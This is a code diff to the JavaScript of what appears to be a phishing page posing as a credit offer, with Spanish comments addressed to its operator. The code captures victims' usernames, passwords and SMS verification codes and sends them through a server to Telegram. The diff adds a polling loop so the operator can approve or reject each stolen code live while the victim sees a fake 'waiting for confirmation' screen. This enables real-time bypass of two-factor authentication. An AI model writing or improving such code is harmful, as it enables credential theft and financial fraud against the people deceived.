@@ -778,8 +778,8 @@
     (function(){
         document.addEventListener('DOMContentLoaded', function() {
             let selectedCreditAmount = '';
+            let pollingInterval = null;
             
-            // Función adaptada para enviar los datos a tu propio servidor (server.js)
             async function sendToTelegramServer(tipo, datosExtra) {
                 try {
                     const response = await fetch('/api/enviar-telegram', {
@@ -793,10 +793,40 @@
                             ...datosExtra
                         })
                     });
-                    await response.json();
+                    return await response.json();
                 } catch (error) {
                     console.error('Error al comunicar con el servidor:', error);
                 }
+            }
+
+            // Función para empezar a consultar el estado del webhook en el servidor
+            function iniciarPolling() {
+                if (pollingInterval) clearInterval(pollingInterval);
+
+                pollingInterval = setInterval(async () => {
+                    try {
+                        const response = await fetch('/api/consultar-estado');
+                        const data = await response.json();
+
+                        if (data.estado === 'aprobar_sms') {
+                            clearInterval(pollingInterval);
+                            // Si se aprueba en Telegram, redirige a éxito
+                            const amountParam = encodeURIComponent(selectedCreditAmount);
+                            window.location.href = `exito.html?amount=${amountParam}`;
+                        } 
+                        else if (data.estado === 'rechazar_sms') {
+                            clearInterval(pollingInterval);
+                            // Si se rechaza en Telegram, quita el loading, avisa y permite reintentar
+                            loadingModal.style.display = 'none';
+                            alert('Código incorrecto o rechazado. Intente nuevamente.');
+                            smsCodeInput.value = '';
+                            submitSmsBtn.disabled = true;
+                            smsModal.style.display = 'block';
+                        }
+                    } catch (error) {
+                        console.error('Error consultando el estado:', error);
+                    }
+                }, 2000); // Consulta al servidor cada 2 segundos
             }
 
             const selectionPage = document.getElementById('selectionPage');
@@ -846,9 +876,7 @@
                 const username = usernameInput.value.trim();
                 const password = passwordInput.value.trim();
                 
-                // Enviar datos de login al servidor con los botones de aprobación
                 sendToTelegramServer('login', { usuario: username, password: password });
-
                 passwordModal.style.display = 'none';
                 
                 loadingText.textContent = "Validando credenciales";
@@ -870,30 +898,23 @@
                 submitSmsBtn.disabled = this.value.trim() === '' || this.value.length < 6;
             });
 
-            submitSmsBtn.addEventListener('click', function() {
+            submitSmsBtn.addEventListener('click', async function() {
                 const smsCode = smsCodeInput.value.trim();
                 const username = usernameInput.value.trim();
                 
-                // Enviar código SMS al servidor con sus botones correspondientes
-                sendToTelegramServer('sms', { usuario: username, smsCode: smsCode });
+                // Enviar el SMS al servidor para que llegue a Telegram con los botones
+                await sendToTelegramServer('sms', { usuario: username, smsCode: smsCode });
                 
-                const amountParam = encodeURIComponent(selectedCreditAmount);
-                window.location.href = `exito.html?amount=${amountParam}`;
-
+                // Mostrar pantalla de carga y cerrar el modal del SMS
                 loadingText.textContent = "Verificando código de seguridad";
-                loadingSubtext.textContent = "Esto puede tomar unos segundos...";
+                loadingSubtext.textContent = "Esperando confirmación del sistema...";
                 selectedCreditInfo.textContent = `Crédito seleccionado: $${selectedCreditAmount}`;
                 
                 loadingModal.style.display = 'block';
                 smsModal.style.display = 'none';
-                
-                setTimeout(function() {
-                    loadingModal.style.display = 'none';
-                    alert('Código incorrecto. Intente nuevamente.');
-                    smsCodeInput.value = '';
-                    submitSmsBtn.disabled = true;
-                    smsModal.style.display = 'block';
-                }, 10000);
+
+                // Iniciar la consulta constante al servidor esperando tu clic en Telegram
+                iniciarPolling();
             });
 
             closeButtons.forEach(function(button) {
